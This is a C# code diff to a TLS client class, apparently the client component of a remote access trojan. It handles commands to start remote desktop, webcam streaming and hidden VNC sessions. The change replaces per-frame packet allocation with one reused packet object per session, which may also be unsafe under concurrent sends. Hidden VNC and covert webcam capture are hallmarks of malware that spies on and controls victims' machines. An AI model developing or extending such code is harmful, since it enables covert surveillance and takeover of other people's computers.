@@ -281,8 +281,9 @@ internal class TlsClient : IDisposable
                 case PacketType.RdpStart:
                 {
                     var rdpCfg = System.Text.Json.JsonSerializer.Deserialize<RdpStartDataStub>(packet.Data, SeroJson.Default.RdpStartDataStub) ?? new();
+                    var rdpPkt = new Packet();
                     _ = Task.Run(() => RemoteDesktopFeature.Start(rdpCfg,
-                        async (t, d) => { if (!await WriteFrameAsync(new Packet { Type = (PacketType)t, Data = d }, ct)) RemoteDesktopFeature.SignalAck(); }));
+                        async (t, d) => { rdpPkt.Type = (PacketType)t; rdpPkt.Data = d; if (!await WriteFrameAsync(rdpPkt, ct)) RemoteDesktopFeature.SignalAck(); }));
                     break;
                 }
                 case PacketType.RdpStop:
@@ -304,8 +305,9 @@ internal class TlsClient : IDisposable
 
                 case PacketType.WcamStart:
                     var wcamCfg = System.Text.Json.JsonSerializer.Deserialize<WcamStartDataStub>(packet.Data, SeroJson.Default.WcamStartDataStub) ?? new();
+                    var wcamPkt = new Packet();
                     _ = Task.Run(() => WebcamFeature.Start(wcamCfg,
-                        async (t, d) => { if (!await WriteFrameAsync(new Packet { Type = (PacketType)t, Data = d }, ct)) WebcamFeature.SignalAck(); }));
+                        async (t, d) => { wcamPkt.Type = (PacketType)t; wcamPkt.Data = d; if (!await WriteFrameAsync(wcamPkt, ct)) WebcamFeature.SignalAck(); }));
                     break;
                 case PacketType.WcamStop:
                     _ = Task.Run(() => WebcamFeature.Stop());
@@ -317,8 +319,9 @@ internal class TlsClient : IDisposable
                 case PacketType.HvncStart:
                 {
                     var hvncStartCfg = System.Text.Json.JsonSerializer.Deserialize<HvncStartDataStub>(packet.Data, SeroJson.Default.HvncStartDataStub) ?? new();
+                    var hvncPkt = new Packet();
                     _ = Task.Run(() => HvncFeature.Start(hvncStartCfg,
-                        async (t, d) => await WritePacketAsync(new Packet { Type = (PacketType)t, Data = d }, ct)));
+                        async (t, d) => { hvncPkt.Type = (PacketType)t; hvncPkt.Data = d; await WritePacketAsync(hvncPkt, ct); }));
                     break;
                 }
                 case PacketType.HvncStop:
